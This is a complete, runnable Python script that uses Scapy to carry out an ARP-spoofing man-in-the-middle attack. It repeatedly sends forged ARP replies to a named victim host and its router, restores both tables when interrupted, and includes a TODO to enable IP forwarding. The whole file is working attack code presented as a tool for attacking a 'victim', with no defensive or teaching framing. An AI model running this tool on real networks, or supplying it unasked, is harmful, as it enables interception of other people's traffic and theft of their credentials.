#!/usr/bin/python3

from scapy.all import *

import sys
import os
import time
from datetime import datetime

import argparse
import subprocess

from pyfiglet import Figlet


def arp_spoof(dest_ip, dest_mac, source_ip, iface):
	attacker_mac = get_if_hwaddr(conf.iface)

	wh = datetime.now().strftime('%H:%M:%S')

	packet = ARP(op='is-at', hwdst=dest_mac, hwsrc=attacker_mac, pdst=dest_ip, psrc=source_ip)

	send(packet, iface=iface, verbose=False)

	
	print(f'[+] {wh} Sending ARP package to {dest_ip}: {source_ip} is-at {attacker_mac}')


def arp_restore(dest_ip, dest_mac, source_ip, source_mac, iface):
    packet = ARP(op='is-at', hwsrc = source_mac, psrc = source_ip,
                hwdst = dest_mac, pdst = dest_ip)

    send(packet, iface=iface, verbose=False)


def start_attack(victim_ip, victim_mac, router_ip, router_mac, iface, delay):
	try:
		print("[+] Sending spoofed ARP packets. Ctrl+C to interrupt")
		print(f'[+] Using {iface} interface\n')

		while True:
			arp_spoof(victim_ip, victim_mac, router_ip, iface=iface)
			arp_spoof(router_ip, router_mac, victim_ip, iface=iface,)
			print()
			time.sleep(delay) 

	except KeyboardInterrupt:
		print("\n[+] Attack was terminated")
	finally:
		print("[+] Restoring an arp table")
		arp_restore(router_ip, router_mac, victim_ip, victim_mac, iface=iface)
		arp_restore(victim_ip, victim_mac, router_ip, router_mac, iface=iface)
	



def set_args():
	parser = argparse.ArgumentParser(description = "Tool for conducting an arpspoof attack", epilog=f" {sys.argv[0]} -i eth0 -v <first target IP> -r <second target IP>")
	parser.add_argument('-i', '--interface', help = 'Specified a network interface for attack')
	parser.add_argument('-v', '--victim', help = 'First target IP')
	parser.add_argument('-r', '--router', help = 'Second target IP. It can be any target. Not only router IP')
	parser.add_argument('-d', '--delay', type=int, default=5, help='delay between injection of arp packages')
	return parser.parse_args()


def main(args):
	victim_ip = args.victim
	router_ip = args.router
	iface = args.interface
	delay = args.delay
	
	if iface not in get_if_list() or iface == 'lo':
		print('[-] Invalid intarface')
		exit(1)
		 
	
	victim_mac = getmacbyip(victim_ip)
	router_mac = getmacbyip(router_ip)
	
	
	
	start_attack(victim_ip, victim_mac, router_ip, router_mac, iface, delay)

	



if __name__ == '__main__':

	preview_text = Figlet(font='slant')

	print(preview_text.renderText('ARPSPOOF'))
	
	if os.getuid() != 0:
		print(f'[-] Need root permissions.')
		exit(1)
	elif len(sys.argv) < 2:
		print(f'[-] Need arguments. For more info {sys.argv[0]} --help')
		exit(1)
		
	args = set_args()
	main(args)






# TODO: add `echo 1 > /proc/sys/net/ipv4/ip_forward

	

	




